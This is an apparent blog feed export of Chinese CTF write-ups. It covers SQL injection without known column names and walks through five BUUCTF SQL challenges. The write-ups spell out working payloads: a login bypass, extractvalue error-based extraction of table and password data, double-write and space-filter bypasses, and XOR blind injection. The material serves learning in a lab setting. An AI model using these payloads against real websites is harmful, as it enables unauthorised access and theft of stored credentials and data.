data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdUxleHI1cDYzQ1VzUW13LnBuZw==\">https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>另外本题还能通过改名和 mysql 约束去做，感觉太麻烦了，没学。。</p>\n<hr>\n<p>后面遇到堆叠注入和预编译的题再补上，就这样</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/21/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/21/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "title": "ctfweb-sql无列名注入",
            "date_published": "2021-06-20T17:04:45.964Z",
            "content_html": "<p>谈谈 sql 注入无列名的情况</p>\n<p>以及该如何解题</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"无列名注入\"><a class=\"anchor\" href=\"#无列名注入\">#</a> <em><strong>无列名注入</strong></em></h1>\n<p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p>\n<p>在大多数 CTF 题目中， <code>information_schema</code>  库被过滤，称为无列名注入。</p>\n<h1 id=\"方法总结\"><a class=\"anchor\" href=\"#方法总结\">#</a> 方法总结</h1>\n<h3 id=\"基于union-select的无列名注入\"><a class=\"anchor\" href=\"#基于union-select的无列名注入\">#</a> <em>基于 union select 的无列名注入</em></h3>\n<hr>\n<p>一般 sql 查询：</p>\n<pre><code class=\"language-mysql\">select * from admin\n</code></pre>\n<p>假设得到列名 id,name,password，则使用联合查询 union：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 union select * from admin\n</code></pre>\n<p>则，数字会替换成列名（联合查询的特性，拼接表），所以 1,2,3 分别对应了 id，name，password</p>\n<pre><code class=\"language-mysql\">select b from (select 1,2,3 as b union select * from admin)a\n</code></pre>\n<p>（b 是 3 的重命名，a 是任意字符，用于命名）</p>\n<p>如果需要查多个列，用 concat () 函数即可。</p>\n<p>order by  用不了的情况下，可以用 group by 代替。</p>\n<h3 id=\"基于join的无列名注入的场景与方法\"><a class=\"anchor\" href=\"#基于join的无列名注入的场景与方法\">#</a> 基于 join 的无列名注入的场景与方法</h3>\n<hr>\n<p>join 后的列名是两个表列名加起来的，可能会产⽣相同的列名，如 id 和 name，使⽤别名时，表中不能出现同的字段名，这就跟 join 第⼀个特点相冲突，所以在 join 和别名同时使⽤时会导致报错。</p>\n<p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名。</p>\n<p><strong>首先获取第一个列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select * from (select * from users as a join users as b)as c\n</code></pre>\n<p>as 主要作用是起别名，就是把 users 表当做 a 表，常规来说 as 可以省略</p>\n<p><strong>获取接下来的列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select*from (select * from users as a join users as b using(id,username))a\n</code></pre>\n<h3 id=\"利用sysschema_auto_increment_columns-库来进行查询\"><a class=\"anchor\" href=\"#利用sysschema_auto_increment_columns-库来进行查询\">#</a> 利用 sys.schema_auto_increment_columns 库来进行查询</h3>\n<hr>\n<p>由于 performance_schema 过于发杂，所以 mysql 在 5.7 版本中新增了 sys schemma，基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p>\n<p><strong>mysql 默认是关闭 InnoDB 存储引擎的</strong></p>\n<p>注入中在 mysql 默认情况下就可以替代 information_schema 库的方法</p>\n<p><strong>payload:</strong></p>\n<p><em>获取库名：</em></p>\n<pre><code class=\"language-mysql\">schema_auto_increment_columns \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+\n</code></pre>\n<pre><code class=\"language-mysql\">schema_table_statistics_with_buffer \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+\n</code></pre>\n<p><strong>限制</strong>：一般要超级管理员才可以访问 sys</p>\n<p>​\t\t\tmysql ≥ 5.7 版本</p>\n<p><em>获取字段名：</em></p>\n<p>用 join 方法或者无列名注入。</p>\n<h3 id=\"利用-innodb-中的库进行查询\"><a class=\"anchor\" href=\"#利用-innodb-中的库进行查询\">#</a> 利用 innodb 中的库进行查询</h3>\n<hr>\n<p>innodb_table_stats 存放库名</p>\n<p>innodb_table_index 存放表名</p>\n<p>使用方法同正常 sql 注入：</p>\n<pre><code class=\"language-mysql\">select table_name from mysql.innodb_table_stats where database_name=库名xxx\n</code></pre>\n<p>** 限制：** 表引擎为 innodb</p>\n<p>​\t\t\tmysql &gt; 5.5</p>\n<h3 id=\"通过报错来达到无列名查询目的\"><a class=\"anchor\" href=\"#通过报错来达到无列名查询目的\">#</a> 通过报错来达到无列名查询目的</h3>\n<hr>\n<p>爆库名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where 1=abc();\n</code></pre>\n<p>爆表名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where Polygon(id);\nselect 1,2,3 from users where linestring(id);\n</code></pre>\n<p>爆列名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b)as c);\n</code></pre>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b using (id))as c);\n</code></pre>\n<p>前提是 users 表存在</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/20/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "url": "http://example.com/2021/06/20/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "title": "(ctfwp)sql注入极客大挑战",
            "date_published": "2021-06-20T09:25:52.913Z",
            "content_html": "<p>buuctf 极客大挑战系列    <em><strong>&lt;u&gt;sql 注入 &lt;/u&gt;</strong></em></p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"no1-easysql\"><a class=\"anchor\" href=\"#no1-easysql\">#</a> NO.1 EasySQL</h1>\n<p>题目如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvV3BZSzJFZmczQWRSam1RLnBuZw==\">https://i.loli.net/2021/06/21/WpYK2Efg3AdRjmQ.png</span>&quot; alt=&quot;easysql1&quot; style=&quot;zoom: 25%;&quot; /&gt;</p>\n<p>先尝试 万能密码</p>\n<pre><code>' or 1=1 #\n</code></pre>\n<p>结果一步得出答案...</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZGJ5RmZ1Tm0yendha3JSLnBuZw==\">https://i.loli.net/2021/06/21/dbyFfuNm2zwakrR.png</span>&quot; alt=&quot;easysql2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<h1 id=\"no2-lovesql\"><a class=\"anchor\" href=\"#no2-lovesql\">#</a> NO.2 LoveSQL</h1>\n<p>题目同上，没变化</p>\n<p>尝试万能密码，找不到有效信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbjQ4TFVHMWs2b3hWbFFaLnBuZw==\">https://i.loli.net/2021/06/21/n48LUG1k6oxVlQZ.png</span>&quot; alt=&quot;love1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<hr>\n<p>尝试报错注入，寻找其他库 / 表：</p>\n<pre><code>1'and extractvalue(1,concat('~',database()))#\n</code></pre>\n<p>顺利得到库名  geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZHhpYVhGUXFCNmNvcFo4LnBuZw==\">https://i.loli.net/2021/06/21/dxiaXFQqB6copZ8.png</span>&quot; alt=&quot;love2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试爆表名：</p>\n<pre><code>1'and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>显示 结果超过一行（<em>Subquery returns more than 1 row</em>），添加 group_connat ()  函数解决。</p>\n<p>所以，输入</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>得到表名 geekuser,l0ve1ysq1</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvb3Z1ZVB0YnNjR2sxNThqLnBuZw==\">https://i.loli.net/2021/06/21/ovuePtbscGk158j.png</span>&quot; alt=&quot;love3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试查表名，目测是第二个</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbXZOWVFNR29MT0E1cDFaLnBuZw==\">https://i.loli.net/2021/06/21/mvNYQMGoLOA5p1Z.png</span>&quot; alt=&quot;love4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试获取信息</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=1)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQWd3Yk9WYW01Y0I5RkwyLnBuZw==\">https://i.loli.net/2021/06/21/AgwbOVam5cB9FL2.png</span>&quot; alt=&quot;love5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>又查了几个 id 全是废话，直接爆破吧</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvVmgyakdBMWxYOEJiY3JhLnBuZw==\">https://i.loli.net/2021/06/21/Vh2jGA1lX8Bbcra.png</span>&quot; alt=&quot;love6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvWUVENkxiNzhlcW5sazNQLnBuZw==\">https://i.loli.net/2021/06/21/YED6Lb78eqnlk3P.png</span>&quot; alt=&quot;love7&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>爆破得出 id=16 处有 flag 没显示全</p>\n<p>前半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>后半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select substr(password,15,30) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUlhoZlUycjhkN0dTNUNKLnBuZw==\">https://i.loli.net/2021/06/21/RXhfU2r8d7GS5CJ.png</span>&quot; alt=&quot;love8&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZkU2OEZ2WVhuUndWSE91LnBuZw==\">https://i.loli.net/2021/06/21/fE68FvYXnRwVHOu.png</span>&quot; alt=&quot;love9&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p fd752c8f-8f92-4b6f-93fa-0f99791741f0>得  flag</p>\n<h1 id=\"no3-babysql\"><a class=\"anchor\" href=\"#no3-babysql\">#</a> NO.3 BabySQL</h1>\n<p>老方法 万能密码走一遍，果然不行～</p>\n<p>选择做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNVFjTzRDWkduYjM4MjdyLnBuZw==\">https://i.loli.net/2021/06/21/5QcO4CZGnb3827r.png</span>&quot; alt=&quot;baby1&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>不难发现 len 726 长度都被过滤成空 ''  所以显示没有输入，</p>\n<p>而 len 751 都没有被过滤，</p>\n<p>这种过滤比较简单，所以直接考虑 <strong>双写绕过</strong>。</p>\n<p>通过报错注入</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,database()))#\n</code></pre>\n<p>得到库名 geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvRXdTM296VEY4Nk1DUGxYLnBuZw==\">https://i.loli.net/2021/06/21/EwS3ozTF86MCPlX.png</span>&quot; alt=&quot;baby2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆表名</p>\n<pre><code> **1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema=&quot;geek&quot;)))#**     \n</code></pre>\n<p>得到表名 b4bsql,geekuser</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUVJBdEwxQjlZNEhUemVDLnBuZw==\">https://i.loli.net/2021/06/21/QRAtL1B9Y4HTzeC.png</span>&quot; alt=&quot;baby3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆列名</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&quot;b4bsql&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaUpybmM4czFaQzlEbU9FLnBuZw==\">https://i.loli.net/2021/06/21/iJrnc8s1ZC9DmOE.png</span>&quot; alt=&quot;baby4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查询数据</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect concat_ws(0x7e,id,username,passwoorrd)frfromom b4bsql whwhereere id=1)))#\n</code></pre>\n<p>同上，又是一堆废话，直接爆破，得到 id=8 时有 flag</p>\n<p>剩下步骤同上一题</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaG10WHY3anFuSFdaRXlELnBuZw==\">https://i.loli.net/2021/06/21/hmtXv7jqnHWZEyD.png</span>&quot; alt=&quot;baby5&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>后半部分</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect subsubstrstr(passwoorrd,15,30)frfromom b4bsql whwhereere id=8)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEva3dUaDRFOUlvY1ZRbmpxLnBuZw==\">https://i.loli.net/2021/06/21/kwTh4E9IocVQnjq.png</span>&quot; alt=&quot;baby6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 50ba0844-d76f-4a9a-892f-bc7694528c7e>得 flag</p>\n<h1 id=\"no4-hardsql\"><a class=\"anchor\" href=\"#no4-hardsql\">#</a> NO.4 HardSQL</h1>\n<p>万能密码走一下，失败</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvMXVqZUdjRno0bnJ2OWw4LnBuZw==\">https://i.loli.net/2021/06/21/1ujeGcFz4nrv9l8.png</span>&quot; alt=&quot;hard1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>直接做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvYU9XSXRmeDZpWFBLQkxrLnBuZw==\">https://i.loli.net/2021/06/21/aOWItfx6iXPKBLk.png</span>&quot; alt=&quot;hard2&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>如图，len 736 都被屏蔽了</p>\n<p>len 751 没被屏蔽，另外空格在实际输入中也被屏蔽了，所以空格用括号代替。</p>\n<p>尝试报错注入 **1'or (extractvalue (1,concat (0x7e,database ())))#</p>\n<p>顺利得到库名  geek</p>\n<p>图同上，略</p>\n<p>尝试爆表名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where((table_schema)like(&quot;geek&quot;))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQ1FpRUx1TXo3anRGMnNvLnBuZw==\">https://i.loli.net/2021/06/21/CQiELuMz7jtF2so.png</span>&quot; alt=&quot;hard3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>得到表名 H4rDsq1</p>\n<p>尝试爆列名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&quot;H4rDsq1&quot;))))))#\n</code></pre>\n<p>得 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaHROYVVCeFlSQ3dsYmpBLnBuZw==\">https://i.loli.net/2021/06/21/htNaUBxYRCwlbjA.png</span>&quot; alt=&quot;hard4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查找信息</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>得 flag 前半段</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvdWQ4TDVBdHY3VnlOV0RyLnBuZw==\">https://i.loli.net/2021/06/21/ud8L5Atv7VyNWDr.png</span>&quot; alt=&quot;hard5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查后半段</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaVRmY3g4cHdReW1KRUxNLnBuZw==\">https://i.loli.net/2021/06/21/iTfcx8pwQymJELM.png</span>&quot; alt=&quot;hard6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 7725665e-c9b1-4558-b610-12bcccca00ce>flag</p>\n<h1 id=\"no5-finalsql\"><a class=\"anchor\" href=\"#no5-finalsql\">#</a> NO.5 FinalSQL</h1>\n<p>根据界面提示 本题可能为 sql 盲注</p>\n<p>所以先做 FUZZ 测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNFpBTllPcWp1M3MyUTVELnBuZw==\">https://i.loli.net/2021/06/21/4ZANYOqju3s2Q5D.png</span>&quot; alt=&quot;fin1&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>可以发现，大部分语句被屏蔽，选择盲注。而点击 1 时，发现</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUGpIblNvUnlHSXpmdWw4LnBuZw==\">https://i.loli.net/2021/06/21/PjHnSoRyGIzful8.png</span>&quot; alt=&quot;fin2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>而输入 7 时</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNm1yemhuRXBTYWxna2NqLnBuZw==\">https://i.loli.net/2021/06/21/6mrzhnEpSalgkcj.png</span>&quot; alt=&quot;fin3&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>输入更大的超范围数同理，发现注入点</p>\n<p>用 FUZZ 测试，个别未被屏蔽，但报错信息被屏蔽</p>\n<p>最后我选择用异或 ^ 注入进行盲注：</p>\n<p>1^(sql 注入判断语句)</p>\n<p>如果显示（NO！），说明 id=1，进一步说明 sql 判断语句为 假</p>\n<p>如果显示（ERROR!!!），说明 id=0，进一步说明 sql 判断语句为 真</p>\n<p>写一个 py 跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvOGVRYVQ3ZnFNbmtYb0h3LnBuZw==\">https://i.loli.net/2021/06/21/8eQaT7fqMnkXoHw.png</span>&quot; alt=&quot;fin4&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>同理将 datebase () 替换为</p>\n<pre><code>(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0FlQjQ5YUNrZEY2bzVTLnBuZw==\">https://i.loli.net/2021/06/21/sAeB49aCkdF6o5S.png</span>&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>再换为</p>\n<pre><code>(select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y')\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZEVYSTZPR29hSlBDckhCLnBuZw==\">https://i.loli.net/2021/06/21/dEXI6OGoaJPCrHB.png</span>&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>再换</p>\n<pre><code>(select(group_concat(passVord))from(F1naI1y))\n</code></pre>\n<p>再跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0dYdFNsUlY3UE11YUs1LnBuZw==\">https://i.loli.net/2021/06/21/sGXtSlRV7PMuaK5.png</span>&quot; alt=&quot;fin8&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>得出 flag</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>写了一下午，当然，总结出一些 sql 相关的东西</p>\n<p>1. 页面上有显示位时，用联合注入 union；页面上没有显示位，但是有 SQL 语句执行错误信息输出时用报错注入</p>\n<p>2. 联合查询 先判断整型还是字符型，order by 查列数，获取库名，获取表名，获取字段名，获取数据</p>\n<p>3. 报错注入不用查列数，直接通过 extractvalue 函数报错查信息</p>\n<p>4. 当有绕过时，进行模糊测试，考虑是否为 双写绕过或空格绕过</p>\n<p>5. 若都不是，找可注入点进行盲注，一般这种题都会有可注入点让我们下手。盲注写 py 暴力破解即可。</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        }
    ]
}